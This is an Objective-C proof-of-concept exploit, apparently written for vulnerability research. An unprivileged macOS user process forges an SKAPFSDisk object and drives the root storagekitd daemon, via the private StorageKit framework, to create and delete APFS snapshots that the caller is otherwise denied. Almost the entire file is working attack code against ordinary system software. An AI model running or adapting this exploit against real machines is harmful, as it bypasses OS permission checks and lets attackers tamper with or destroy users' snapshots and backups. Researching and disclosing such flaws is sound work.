// Unentitled uid501 PoC: drive root storagekitd (com.apple.storagekitd) to CREATE then DELETE
// an APFS snapshot, using a client-forged SKAPFSDisk. Neither uid501 nor a root shell can call
// fs_snapshot_create/delete directly (EPERM) — only the vfs.snapshot-entitled daemon can.
#import <Foundation/Foundation.h>
#import <dlfcn.h>

@interface SKH : NSObject
- (instancetype)init;
- (void)createSnapshot:(id)name disk:(id)disk completionBlock:(void(^)(NSError *))b;
- (void)deleteSnapshots:(NSArray *)snaps disk:(id)disk completionBlock:(void(^)(NSError *))b;
- (void)allSnapshotsForDisk:(id)disk completionBlock:(void(^)(NSArray *snaps, NSError *err))b;
@end

static id forgeDisk(Class SKAPFSDisk, NSString *mp) {
    id disk = [[SKAPFSDisk alloc] init];
    NSDictionary *kv = @{
        @"mountPoint": mp, @"diskObjectID": @(1), @"diskIdentifier": @"disk3s7",
        @"volumeUUID": @"00000000-0000-0000-0000-000000000000",
        @"mediaUUID":  @"00000000-0000-0000-0000-000000000000",
        @"type": @"Apple_APFS", @"filesystemType": @"apfs", @"volumeName": @"skScratch",
        @"ioContent": @"41504653-0000-11AA-AA11-00306543ECAC", @"role": @"",
        @"protocol": @"", @"mediaName": @"skScratch",
    };
    for (NSString *k in kv) { @try { [disk setValue:kv[k] forKey:k]; } @catch(NSException *e){} }
    return disk;
}

static NSError *callCreate(SKH *c, id disk, NSString *name) {
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    __block NSError *e = nil;
    [c createSnapshot:name disk:disk completionBlock:^(NSError *err){ e = err; dispatch_semaphore_signal(s); }];
    if (dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 30LL*NSEC_PER_SEC))) return (id)@"TIMEOUT";
    return e;
}
static NSError *callDelete(SKH *c, id disk, NSString *name) {
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    __block NSError *e = nil;
    [c deleteSnapshots:@[name] disk:disk completionBlock:^(NSError *err){ e = err; dispatch_semaphore_signal(s); }];
    if (dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 30LL*NSEC_PER_SEC))) return (id)@"TIMEOUT";
    return e;
}

int main(int argc, char **argv) {
    @autoreleasepool {
        NSString *mp   = [NSString stringWithUTF8String:argv[1]];
        NSString *name = [NSString stringWithUTF8String:argv[2]];
        printf("[*] uid=%d  euid=%d   (unentitled, adhoc-signed)\n", getuid(), geteuid());
        if (!dlopen("/System/Library/PrivateFrameworks/StorageKit.framework/StorageKit", RTLD_NOW)) { printf("dlopen fail\n"); return 1; }
        Class SKAPFSDisk = NSClassFromString(@"SKAPFSDisk");
        Class SKHelperClient = NSClassFromString(@"SKHelperClient");

        SKH *c = [[SKHelperClient alloc] init];
        id disk = forgeDisk(SKAPFSDisk, mp);
        printf("[*] target mountPoint = %s   snapshot name = %s\n", argv[1], argv[2]);

        printf("\n[1] uid501 -> storagekitd createSnapshot ...\n");
        NSError *e1 = callCreate(c, disk, name);
        printf("    create result: %s\n", e1 ? [[e1 description] UTF8String] : "nil (daemon reports SUCCESS)");

        printf("\n[*] sleeping 1s then PoC exits; harness verifies via diskutil.\n");
        // Note: delete is invoked by the shell harness in a SEPARATE run to capture before/after cleanly.
        if (argc > 3 && strcmp(argv[3], "delete") == 0) {
            printf("\n[2] uid501 -> storagekitd deleteSnapshots ...\n");
            NSError *e2 = callDelete(c, disk, name);
            printf("    delete result: %s\n", e2 ? [[e2 description] UTF8String] : "nil (daemon reports SUCCESS)");
        }
    }
    return 0;
}
